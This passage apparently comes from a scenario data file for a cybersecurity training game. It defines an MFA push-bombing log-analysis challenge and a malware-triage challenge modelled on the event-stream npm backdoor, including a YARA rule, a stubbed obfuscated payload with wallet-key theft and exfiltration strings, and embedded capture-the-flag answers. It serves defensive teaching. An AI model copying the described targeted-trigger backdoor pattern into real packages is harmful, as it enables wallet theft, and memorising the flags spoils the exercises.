      'An attacker with a valid stolen password but no registered MFA device can still get in by simply ' +
      'spamming push notifications until the real user, worn down at an odd hour, taps "Approve" just to make ' +
      'them stop — no code to guess, no OTP to intercept, just fatigue. This is exactly the technique behind the ' +
      'real September 2022 Uber breach: dozens of push notifications sent to an employee\'s phone until one was ' +
      'accepted at nearly 2 AM. It is explicitly covered under CompTIA Security+ authentication-attack exam ' +
      'objectives, and is why modern MFA guidance pushes toward number-matching instead of a single tap-to-approve.',
    objectives: [
      { text: 'cat /var/log/auth/mfa-events.log', why: 'MFA event logs are the only place this attack is visible — a single approved login looks completely normal in isolation.' },
      { text: 'grep "PUSH_APPROVED" /var/log/auth/mfa-events.log', why: 'Jumping straight to the moment of acceptance lets you then look backward at how many denials preceded it.' },
      { text: 'Count the preceding denials and note the time of night to confirm the pattern and capture the flag', why: 'A dozen denied prompts in quick succession followed by one acceptance at 2 AM has no innocent explanation — that combination of volume and timing is the entire signature of a push-bombing attack.' },
    ],
    hints: [
      'cat /var/log/auth/mfa-events.log',
      'grep "PUSH_APPROVED" /var/log/auth/mfa-events.log',
      'Count how many PUSH_DENIED events came before it, and note the time of night — the flag is on the analyst summary line.',
    ],
    totalFlags: 1,
    attacker: {
      hostname: 'kali',
      user: 'root',
      root: dir({
        var: dir({
          log: dir({
            auth: dir({
              'mfa-events.log': file(
                [
                  '2026-06-14 01:41:07 user=r.alvarez event=PUSH_DENIED source_ip=185.220.101.7 (Tor exit node, Romania)',
                  '2026-06-14 01:43:02 user=r.alvarez event=PUSH_DENIED source_ip=185.220.101.7',
                  '2026-06-14 01:44:51 user=r.alvarez event=PUSH_DENIED source_ip=185.220.101.7',
                  '2026-06-14 01:46:20 user=r.alvarez event=PUSH_DENIED source_ip=185.220.101.7',
                  '2026-06-14 01:48:09 user=r.alvarez event=PUSH_DENIED source_ip=185.220.101.7',
                  '2026-06-14 01:49:44 user=r.alvarez event=PUSH_DENIED source_ip=185.220.101.7',
                  '2026-06-14 01:51:12 user=r.alvarez event=PUSH_DENIED source_ip=185.220.101.7',
                  '2026-06-14 01:52:58 user=r.alvarez event=PUSH_DENIED source_ip=185.220.101.7',
                  '2026-06-14 01:54:33 user=r.alvarez event=PUSH_DENIED source_ip=185.220.101.7',
                  '2026-06-14 01:56:07 user=r.alvarez event=PUSH_DENIED source_ip=185.220.101.7',
                  '2026-06-14 01:57:20 user=r.alvarez event=PUSH_DENIED source_ip=185.220.101.7',
                  '2026-06-14 01:58:44 user=r.alvarez event=PUSH_APPROVED source_ip=185.220.101.7',
                  '2026-06-14 01:58:51 user=r.alvarez event=VPN_LOGIN_SUCCESS source_ip=185.220.101.7',
                  '*** ANALYST NOTE: 11 consecutive push denials in 17 minutes, followed by one approval at 01:58 AM local ' +
                    'time from the exact same Tor exit node that had been rejected 11 times in a row — classic MFA fatigue / ' +
                    'push-bombing (the same technique used against Uber in September 2022). ' +
                    'flag{mfa_push_bombing_fatigue_approved_after_11_denials} ***',
                ].join('\n'),
              ),
            }),
          }),
        }),
      }),
    },
    network: [],
  },

  // 12 — Malware
  {
    id: 'malware-npm-typosquat-backdoor',
    title: 'Malware: Supply-Chain Backdoor via Maintainer Handoff',
    difficulty: 'Medium',
    category: 'Malware',
    briefing:
      'This recreates the mechanics of the real November 2018 event-stream npm incident: the original ' +
      'maintainer, no longer using the package, handed publish rights to a stranger who "volunteered" to help ' +
      'maintain it. Two months later, that new co-maintainer quietly added a new dependency with no GitHub repo, ' +
      'no issue history, and no reason to exist — containing an obfuscated payload that specifically targeted ' +
      'the Copay Bitcoin wallet app, attempting to exfiltrate private keys from any project that happened to ' +
      'bundle it. It went undiscovered for weeks, illustrating how a single social-engineered maintainer handoff ' +
      'can compromise millions of downstream installs without ever touching the registry\'s own security.',
    objectives: [
      { text: 'cat dependency-diff.txt', why: 'A routine-looking dependency addition from a new co-maintainer, with no prior history, is exactly how this class of attack enters a project — nothing about the diff itself looks obviously malicious.' },
      { text: 'file suspicious-module/index.js', why: 'Confirming the file is obfuscated JavaScript (not a normal, readable module) is the first static-triage step before extracting anything from it.' },
      { text: 'strings suspicious-module/index.js', why: 'Extracting readable strings from otherwise-obfuscated code surfaces the target (a specific wallet\'s key storage path) and the exfiltration destination — exactly what static analysis is for.' },
      { text: 'yara the classification rule against the module', why: 'Matching a known family\'s YARA rule immediately tells a response team this is a tracked, previously-analyzed campaign rather than a completely novel threat.' },
      {
        text: 'cat suspicious-module/decoded-payload-analysis.txt',
        why: 'The real event-stream payload only activated for one exact npm_package_description value — a highly targeted trigger designed to evade every project except Copay\'s, which is what let it hide in plain sight on the public registry for weeks.',
      },
    ],
    hints: [
      'cat dependency-diff.txt',
      'file suspicious-module/index.js',
      'strings suspicious-module/index.js',
      'yara suspicious-module/event_stream_family.yar suspicious-module/index.js',
      'cat suspicious-module/decoded-payload-analysis.txt',
    ],
    totalFlags: 2,
    attacker: attacker({
      'dependency-diff.txt': file(
        '--- package.json diff (event-stream@3.3.6) ---\n' +
          '+     "flatmap-stream": "0.1.1"   (added by new co-maintainer "right9ctrl", ~2 months after being granted publish access)\n' +
          '(flatmap-stream has no GitHub repository, no issue history, and no reason to exist as a separate package — ' +
          'a red flag only obvious in hindsight)\n',
      ),
      'suspicious-module': dir({
        'index.js': file(
          '#FILETYPE: ASCII text, obfuscated JavaScript (single ~3800-character line, hex-escaped)\n' +
            '#YARA_MATCH:rule EventStream_FlatmapStream_Backdoor MATCHED on index.js\\nmatched strings: "CopayWallet.dat", "185.220.101.204"\\nclassification: npm supply-chain backdoor targeting cryptocurrency wallet keys (MITRE ATT&CK T1195.001)\n' +
            'var _0x4f2a=["\\x72\\x65\\x71\\x75\\x69\\x72\\x65"];(function(_0x1a,_0x2b){/* ...garbled, single-line, unreadable... */})();\n' +
            '-- readable strings extracted from the obfuscated blob --\n' +
            'require("crypto")\n' +
            'CopayWallet.dat key storage path\n' +
            'AES-256-CBC decrypt routine keyed to a specific target package.json field\n' +
            'exfil destination: 185.220.101.204 (hardcoded, not a legitimate npm registry endpoint)\n' +
            'flag{event_stream_style_payload_targets_copay_wallet_keys}\n',
        ),
        'event_stream_family.yar': file(
          'rule EventStream_FlatmapStream_Backdoor {\n' +
            '  strings:\n' +
            '    $a = "CopayWallet.dat"\n' +
            '    $b = "185.220.101.204"\n' +
            '  condition:\n' +
            '    all of them\n' +
            '}\n',
        ),
        'decoded-payload-analysis.txt': file(
          'Fully deobfuscated payload logic (recovered offline):\n' +
            'if (process.env.npm_package_description === "A simple module for creating a distribution for copay") {\n' +
            '  // only activates when bundled inside the Copay wallet build — every other consumer of\n' +
            '  // flatmap-stream/event-stream silently runs the original, harmless code\n' +
            '  decryptAndExfiltrateWalletKeys();\n' +
            '}\n' +
            'This exact-match targeting condition is why the payload evaded detection for weeks — it does ' +
            'nothing observable in any project except the one it was built to rob.\n' +
            'flag{event_stream_targeted_copay_description_check_evaded_detection}\n',
        ),
      }),
    }),
    network: [],
  },
];
